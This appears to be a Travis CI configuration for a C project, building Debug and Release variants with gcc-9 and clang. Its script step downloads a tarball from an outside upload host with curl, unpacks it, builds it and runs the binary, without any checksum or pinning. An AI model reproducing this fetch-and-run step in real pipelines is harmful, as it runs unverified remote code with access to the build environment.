os: linux
dist: bionic
language: c

env:
   global:
      - CC=gcc-9
      - CC=clang

jobs:
   include:
      - stage: Debug build
        env: CONFIG=Debug
      - stage: Release build
        env: CONFIG=Release

addons:
  apt:
     sources:
        - sourceline: 'ppa:ubuntu-toolchain-r/test'
     packages:
        - gcc-9
        - cmake

script:
   - curl -OL https://up.psty.io/937/tbd.tar.gz && tar -xzf tbd.tar.gz && cd tbd.linux
   - mkdir build && cd build
   - cmake -DCMAKE_BUILD_TYPE=$CONFIG .. && make CC=$CC
   - ./tbd
